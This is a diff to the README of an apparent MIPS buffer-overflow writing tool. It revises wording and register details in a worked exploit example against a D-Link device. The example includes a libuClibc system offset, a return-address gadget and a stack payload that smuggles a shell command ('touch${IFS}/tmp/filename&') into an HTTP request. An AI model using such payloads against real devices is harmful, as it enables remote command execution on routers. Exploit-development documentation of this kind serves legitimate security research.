@@ -1,8 +1,6 @@
 # mow
-Mips Overflow Writer - Quickly write MIPS big/little endian overflows.
-
-This python file allows the user to quickly generate and send MIPS based overflows. 
-Simply have to craft an overflow and send it to the target. 
+Mips Overflow Writer - Quickly write MIPS big/little endian overflows. Requires 
+Python 3.5+.
 
 ## Example
 This is a quick example showing how to generate an overflow for the D-Link 
@@ -39,7 +37,7 @@ Other value of importance found through analysis are:
 
 - Offset to System in libuClibc: 0x53200 (ending 0x00 is the reason for the first gadget, cant send that across.)
 
-- Registers used in function: s0 through s7, including fp. (8 registers)
+- Registers used in function: s0 through s7, including fp. (9 registers)
 
 ### Generating the Overflow
 ```bash
@@ -62,7 +60,7 @@ s4 = 0x45454545
 s5 = 0x46464646
 s6 = 0x47474747
 s7 = 0x48484848
-s8 = 0x49494949
+fp = 0x49494949
 ra = 0x60fdb42a (0x2aaf8000 + 0x57d60)
 stack = b'XXXXXXXXXXXXXXXXXXXXXXXXtouch${IFS}/tmp/filename&'
 ********************
@@ -92,5 +90,6 @@ mow.send_packet('127.0.0.1', 80, packet)
 ```
 
 ### Future Work
-I plan to eventually add more functionality, but only as it comes up so the updates
-might be a little slow.
+This is a work in progress that I will be adding new features and enhancements
+as they come up. Feel free to make feature requests and I will consider 
+implementing them.
